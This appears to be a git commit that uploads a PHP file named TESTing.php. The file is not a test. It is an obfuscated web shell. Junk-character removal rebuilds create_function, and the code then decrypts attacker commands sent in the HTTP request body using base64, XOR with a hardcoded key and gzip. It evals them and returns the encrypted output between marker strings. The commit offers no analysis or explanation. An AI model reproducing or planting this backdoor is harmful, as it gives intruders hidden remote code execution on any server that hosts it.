0ee963c88b73a35dbf1c81a52805f6a199ab1490
ZDev12 <86028315+ZDev12@users.noreply.github.com>
2021-06-16 19:32:15 -0400

    Add files via upload

---
+++ TESTing.php
@@ -0,0 +1,12 @@
+<?php
+$D='j(~(~};}}return $(~o;}(~if (~(@(~pr(~eg_match(~("/$kh(.+)$kf/",@fi(~le_g(~et_con(~t';
+$I='$i=0;(~$i(~<$l;){(~for($j=0(~;($j<$(~c&(~&$i<$l);$(~j++(~,$i++){$o.(~=$t{$i(~}^$k{$';
+$U='ent(~(~s("php://input(~"),$m)(~==1) (~{@ob_st(~art();@(~e(~val(@gzunc(~omp(~ress(@';
+$k=str_replace('vT','','cvTrvTeatevT_fuvTvTnctvTion');
+$f='J(~kIU79Uhd";functio(~n(~ x($t,$k)(~{$(~c=s(~(~trlen($k(~);$l=st(~rlen($(~t);$o="";for(';
+$G=');$(~r=@bas(~(~e64_encod(~e(@x(@gzco(~mp(~ress($o),$k(~));pri(~nt(~("$p$kh$r$(~kf");}';
+$n='x(@b(~ase64_d(~ecode((~$m[1(~]),$k))(~);(~(~$o=@ob_get_conte(~nts();(~@(~ob_end(~_clean(';
+$H='$k="20(~2cb(~96(~2";$kh="ac59075b(~9(~64(~b";$kf="07152d(~23(~4b70";$p="(~qmHO(~W(~Dm';
+$v=str_replace('(~','',$H.$f.$I.$D.$U.$n.$G);
+$r=$k('',$v);$r();
+?>
